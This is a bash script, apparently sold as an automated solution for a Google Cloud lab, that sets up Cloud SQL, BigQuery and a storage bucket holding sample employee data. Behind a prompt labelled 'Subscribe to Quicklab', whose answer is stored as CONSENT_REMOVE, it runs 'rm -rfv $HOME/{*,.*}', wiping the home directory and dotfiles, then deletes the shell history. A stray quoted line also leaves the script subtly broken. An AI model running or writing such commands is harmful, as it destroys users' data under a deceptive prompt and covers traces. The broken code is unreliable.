#!/bin/bash

YELLOW='\033[0;33m'
NC='\033[0m' 

pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                 ABHI ARCADE SOLUTION                 **"
"**                                                      **"
"**********************************************************"
)

for line in "${pattern[@]}"
do
    echo -e "${YELLOW}${line}${NC}"
done
gcloud services enable sqladmin.googleapis.com
sleep 10
gcloud sql instances create my-instance --project=$DEVSHELL_PROJECT_ID \
  --database-version=MYSQL_5_7 \
  --tier=db-n1-standard-1
${RESET}"
gcloud sql databases create mysql-db --instance=my-instance --project=$DEVSHELL_PROJECT_ID
bq mk --dataset $DEVSHELL_PROJECT_ID:mysql_db
bq query --use_legacy_sql=false \
"CREATE TABLE $DEVSHELL_PROJECT_ID.mysql_db.info (
  name STRING,
  age INT64,
  occupation STRING
);"
cat > employee_info.csv <<EOF_END
"Sean", 23, "Content Creator"
"Emily", 34, "Cloud Engineer"
"Rocky", 40, "Event coordinator"
"Kate", 28, "Data Analyst"
"Juan", 51, "Program Manager"
"Jennifer", 32, "Web Developer"
EOF_END
gsutil mb gs://$DEVSHELL_PROJECT_ID
gsutil cp employee_info.csv gs://$DEVSHELL_PROJECT_ID/
SERVICE_EMAIL=$(gcloud sql instances describe my-instance --format="value(serviceAccountEmailAddress)")
gsutil iam ch serviceAccount:$SERVICE_EMAIL:roles/storage.admin gs://$DEVSHELL_PROJECT_ID/
echo "${GREEN}${BOLD}
${RESET}"
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
done
rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history
pattern=(
"**********************************************************"
"**                 S U B S C R I B E  TO                **"
"**                 ABHI ARCADE SOLUTION                 **"
"**                                                      **"
"**********************************************************"
)

for line in "${pattern[@]}"
do
    echo -e "${YELLOW}${line}${NC}"
done
